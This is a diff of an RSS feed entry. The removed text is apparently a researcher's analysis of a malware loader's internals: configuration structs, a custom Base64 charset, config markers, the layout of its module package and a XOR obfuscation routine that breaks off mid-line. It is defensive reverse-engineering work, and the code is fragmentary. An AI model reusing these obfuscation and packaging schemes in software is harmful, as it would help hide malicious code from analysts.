-struct config_new { DWORD flags; DWORD unk0; BYTE aes_iv[16]; BYTE mutex_seed[16]; BYTE unk1[18]; WORD padding; BYTE urls[256]; };
-```
-
-As in the previous version, the configuration is stored in the main sample as a Base64 string, encoded with a custom charset. In the current version, the charset used is: `4NOPQRSTUVWXY567DdeEqrstuvwxyz-ABC1fghop23Fijkbc|lmnGHIJKLMZ089a`.
-
-Layers of config deobfuscation before the `0xBEEF` config blob is obtained are:
-
-After that, the configuration is decompressed with LZO algorithm.
-
-This model of configuration was also observed in the version 0.9, and 0.9.1. While 0.9.2 changed the marker to `0xBEEF`, the older variants continued to use the known `RHY!`.
-
-The config contains the field `flags` values of which are used to off and on some possible execution paths. Overview:
-
-As mentioned earlier, the important modules of the malware are stored in an internal package and retrieved on demand.
-
-In the past versions, modules were fetched from the package by their names, or even full paths relative to the internal filesystem. This made researchers’ job easier, since we were able to infer functionality just by looking at the name. Now the authors has moved toward obfuscation and has hidden the names. The modules are represented by checksums.
-
-The reconstructed package structure (Stage 2):
-
-```
-typedef struct DATA_DIR { struct { uint32_t header_rel_off; uint32_t checksum; }; } _DATA_DIR; typedef struct DATA_RECORD { struct { uint32_t size; uint8_t offset[1]; }; } _DATA_RECORD; typedef struct PACKAGE { uint32_t total_size; uint16_t reserved; uint16_t xor_key; uint32_t dir_offset; uint16_t data_offset; uint8_t file_count; uint8_t blk_shift; _DATA_DIR dir[1]; } _PACKAGE;
-```
-
-Whenever modules are about to be retrieved, the raw package, that is shipped as hardcoded in the initial executable, is first decrypted and decompressed. Each time it is done, a fresh XOR key is set for the obfuscation of the modules. We can observe this inside the `decode_package` function:
-
-Once the key is generated, the decompressed content of the package is obfuscated, using a simple XOR-based obfuscation. This way, the authors try to minimize the content that is exposed to memory dumping tools.
-
-```
-void xor_based_enc_dec( const uint8_t* src, std::size_t size, uint8_t* dst, uint16_t key) { for (std::size_t i = 0; i < size; ++i) { dst[i] = src[i] ^ static_cast]]></content:encoded></item></channel></rss>
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item></channel></rss>
